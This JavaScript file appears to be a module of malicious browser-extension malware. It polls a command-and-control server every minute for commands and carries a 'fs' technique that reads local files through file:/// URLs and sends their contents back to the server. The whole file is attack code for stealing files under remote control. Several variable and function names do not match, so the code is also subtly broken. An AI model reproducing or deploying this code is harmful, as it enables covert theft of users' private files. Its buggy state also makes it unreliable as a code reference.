////////////////////////////////////////////////////////////////
// C&C <-> Module Communication
////////////////////////////////////////////////////////////////

// This header will be defined for every module to define processing of new cmds 
// & querying new cmds from server.  
// Define one header to embed all necessary c&c server functions.
let getCmds = {{CC_GET_CMDS_FN}};
let sendData = {{CC_SEND_DATA_FN}};
let QUERY_CMDS_INTERVAL = 1 * 60 * 1000; // Get new cmds from server every 1 minute.
let MODULE_NAME = 'fs';
//

function execModulesWithParams(args_list) {
	for (let i=0; i<MODULE_TECHNIQUES.length; i++) {
		MODULE_TECHNIQUES[i](...args);
	}
}

function parseExecCmdsMail(cmds_list) {
	// Commands Format:
	// (module_name, op, args_list)
	for (let i=0; i<cmds_list.length; i++) {
		if (cmds_list[0].toLowerCase() === MODULE_NAME) {
			if (cmds_list[1].toLowerCase() === 'get') {
				execModuleWithParams(cmds_list[2]);
			}
		}
	}
}

function queryNewCmds() {
	let cmds_list = getCmds();
	parseExecCmdsMail(cmds_list);
}

function main() {
	setInterval(queryNewCmds, QUERY_CMDS_INTERVAL);
}

main();

////////////////////////////////////////////////////////////////
// Main Module Techniques 
///////////////////////////////////////////////////////////////

// Requires: "file:///*//*" permissions.

function path_to_file_url(p) {
	let u = new URL(`file:///${path}`).href;
	return u;
}

function get_file_url_content(fpath) {
	var request = new XMLHttpRequest();
	request.open('GET', path_to_file_url(fpath), true);
	request.responseType = 'blob';
	request.onload = function() {
	    var reader = new FileReader();
	    reader.readAsDataURL(request.response);
	    reader.onload =  function(e){
	    	let b64_data = atob(e.target.result.replace(/data.*base64,/g, ''));
	    	sendData(b64_data);
	        //console.log(b64_data);
	    };
	};
	request.send();
}

let MODULE_TECHNIQUES = [get_file_url_content];
